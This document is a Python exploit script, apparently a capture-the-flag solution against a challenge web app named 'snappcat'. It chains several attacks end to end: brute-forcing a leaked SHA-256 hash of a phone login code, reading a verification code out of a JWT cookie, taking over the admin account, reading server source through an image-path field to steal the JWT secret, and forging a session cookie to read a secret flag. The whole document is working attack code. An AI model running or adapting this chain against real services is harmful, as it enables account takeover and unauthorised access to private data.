import requests
import random
import os
import string
import json
import hashlib
import jwt
import base64

url = "https://snappcat.spchallenge.ir/"
session = requests.Session()


def post(endpoint, data):
	return session.post(url + endpoint, json=data, headers={"content-type":"application/json"})


def get(endpoint, **kw):
	return session.get(url + endpoint, **kw)


def gen_phone():
	return "+98" + "".join(random.choice("09123456789") for _ in range(10))


def gen_email():
	return "".join(random.choice(string.ascii_letters) for _ in range(10)) + "@gmail.com"

# register random user
user1_username = os.urandom(8).hex()
user1_password = os.urandom(8).hex()
user1_phone = gen_phone()
user1_email = gen_email()


data = {
  "username": user1_username,
  "password": user1_password,
  "phoneNumber": user1_phone,
  "email": user1_email
}


print("[+] registering with %s: " % user1_username)
resp = post("api/user/register", data)
print("[+] response: ", resp.json())


print("[+] logging in with %s" % user1_username)
resp = post("api/user/login", {"username": user1_username, "password": user1_password})
print("[+] resposne: ", resp.json())


print("[+] login with phone: %s" % user1_phone)
resp = post("api/user/login-with-phone", {"phoneNumber": user1_phone})
sha_ = resp.json().get("code").get("sha256")
print("[+] response:", resp.status_code)

print("[+] crack the code for sha256:%s" % sha_)
code = None
for i in range(1000000, 9999999):
	if sha_ == hashlib.sha256(str(i).encode()).hexdigest():
		code = i
		break

if not code:
	print("[-] could not crack the code :/")
	exit(1)

print("[+] code cracked:", code)

print("[+] send code")
resp = post("api/user/login-with-phone-callback", {"phoneNumber": user1_phone, "code": code})
print("[+] login-with-phone-callback response: ", resp.json())


print("[+] send verification email")
resp = post("api/user/send-verification-email", {})
print("[+] response:", resp.status_code)


print("[+] verify account")
email_code = json.loads(base64.b64decode(resp.cookies.get_dict().get("sess").split(".")[1].encode())).get("verificationCode")
resp = get("api/user/email-verification-callback", params={"code": email_code})
print("[+] response:", resp.status_code)


# BECOME ADMIN


resp = get("api/user/1") # admin user
phoneNumber = resp.json().get("data").get("phoneNumber")

print("[+] login with phone: %s" % phoneNumber)
resp = post("api/user/login-with-phone", {"phoneNumber": phoneNumber})
sha_ = resp.json().get("code").get("sha256")
print("[+] response:", resp.status_code)


print("[+] crack the code for sha256:%s" % sha_)
code = None
for i in range(1000000, 9999999):
	if sha_ == hashlib.sha256(str(i).encode()).hexdigest():
		code = i
		break

if not code:
	print("[-] could not crack the code :/")
	exit(1)

print("[+] code cracked:", code)

print("[+] send code")
resp = post("api/user/login-with-phone-callback", {"phoneNumber": phoneNumber, "code": code})
print("[+] login-with-phone-callback response: ", resp.json())


whoami = get("api/user/self-id")
print("[+] whoami?: ", whoami.json()) # if userId == 1 -> you are admin XD


# create cats
print("[+] create cat")
resp = post("api/cat/create", {"name": "string", "imagePath": "/app/index.js", "isCute": True ,"isFluffy": True})
catId = resp.json().get("data").get("catId")
print("[+] cat created with id:", catId)


print("[+] display and get created cat")
cat = get("api/cat/" + catId)
d = base64.b64decode(cat.json().get("data").get("cat").get("image").encode()).decode()

# flag is here /secrets-8d5a332d9de35f593e5252c70c0f8d3e/flag but need to  set 'canReadSecrets' to true in cookies
# so to change cookie directly, we need the jwt_secret
jwt_secret = d.splitlines()[14].split(" ")[-1].replace("'", "")

print("-" * 100)
print("JWT SECRET:", jwt_secret)
print("-" * 100)

print("[+] update jwt session")
curr_sess = jwt.decode(session.cookies.get_dict().get("sess"), algorithms=["HS256"],options={"verify_signature": False})
curr_sess.update({"canReadSecrets": 1})

new_sess = jwt.encode(curr_sess, jwt_secret)
session.cookies.update({"sess": new_sess})

print("[+] reading flag xd")
flag = get("secrets-8d5a332d9de35f593e5252c70c0f8d3e/flag")
print(flag.text)